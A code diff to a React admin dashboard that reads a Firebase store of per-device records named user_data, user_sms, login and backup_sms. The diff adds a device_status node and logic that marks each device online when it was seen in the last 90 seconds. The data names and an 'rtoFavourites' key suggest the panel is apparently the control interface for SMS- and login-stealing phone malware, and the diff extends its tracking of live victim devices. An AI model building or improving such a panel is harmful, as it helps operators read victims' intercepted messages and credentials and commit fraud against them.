@@ -17,7 +17,13 @@ export default function AdminDashboard() {
   const [passwordInput, setPasswordInput] = useState("");
   const [passwordError, setPasswordError] = useState(false);
 
-  const [data, setData] = useState({ user_data: {}, user_sms: {}, login: {}, backup_sms: {} });
+  const [data, setData] = useState({ 
+    user_data: {}, 
+    user_sms: {}, 
+    login: {}, 
+    backup_sms: {}, 
+    device_status: {} 
+  });
   const [activePanel, setActivePanel] = useState("devices");
   const [favourites, setFavourites] = useState([]);
   const [deviceOnlineStatus, setDeviceOnlineStatus] = useState({});
@@ -81,6 +87,7 @@ export default function AdminDashboard() {
     localStorage.setItem("rtoFavourites", JSON.stringify(next));
   };
 
+  // Realtime Firebase Live Status Listener
   useEffect(() => {
     if (!isAuthenticated) return;
 
@@ -90,16 +97,42 @@ export default function AdminDashboard() {
       setData(val);
 
       const devs = val.user_data || {};
+      const devStatus = val.device_status || {};
       const onlineMap = {};
       const serialMap = {};
       const now = Date.now();
 
-      Object.keys(devs).forEach((id) => {
-        const d = devs[id];
-        const lastSeen = d.last_online || d.timestamp || 0;
-        onlineMap[id] = d.isOnline || d.online || now - lastSeen < 120000;
+      // Sabhi devices merge karein (user_data + device_status)
+      const allDeviceKeys = Array.from(new Set([...Object.keys(devs), ...Object.keys(devStatus)]));
 
-        let serial = d.user_serial || d.uesr_serial || 0;
+      allDeviceKeys.forEach((id) => {
+        const d = devs[id] || {};
+        const s = devStatus[id] || {};
+
+        let isOnline = false;
+
+        // 1. Direct "device_status" node se status check
+        if (s.status && typeof s.status === "string") {
+          isOnline = s.status.toLowerCase() === "online";
+        }
+
+        // 2. Last seen timestamp check (agar last 90 seconds me active tha)
+        if (s.last_seen) {
+          const parsedTime = Date.parse(s.last_seen);
+          if (!isNaN(parsedTime)) {
+            isOnline = (now - parsedTime) < 90000;
+          }
+        } else if (d.last_online || d.timestamp) {
+          const t = d.last_online || d.timestamp;
+          const parsed = typeof t === "number" ? t : Date.parse(t);
+          if (!isNaN(parsed)) {
+            isOnline = (now - parsed) < 90000;
+          }
+        }
+
+        onlineMap[id] = isOnline;
+
+        let serial = d.user_serial || d.uesr_serial || s.user_serial || 0;
         if (typeof serial === "string") serial = parseInt(serial) || 0;
         serialMap[id] = serial;
       });
@@ -218,7 +251,7 @@ export default function AdminDashboard() {
         <div className="top-right">
           <div className="connection-status online">
             <span className="dot"></span>
-            <span>Realtime Cloud</span>
+            <span>Realtime Live</span>
           </div>
           <button 
             onClick={handleLogout} 
@@ -237,7 +270,7 @@ export default function AdminDashboard() {
             <button className={`nav-item ${activePanel === "devices" ? "active" : ""}`} onClick={() => setActivePanel("devices")}>
               <i className="fas fa-mobile-alt"></i>
               <span>Devices</span>
-              <span className="nav-badge">{Object.keys(data.user_data || {}).length}</span>
+              <span className="nav-badge">{Object.keys(data.device_status || data.user_data || {}).length}</span>
             </button>
             <button className={`nav-item ${activePanel === "favourites" ? "active" : ""}`} onClick={() => setActivePanel("favourites")}>
               <i className="fas fa-star" style={{ color: "var(--gold)" }}></i>
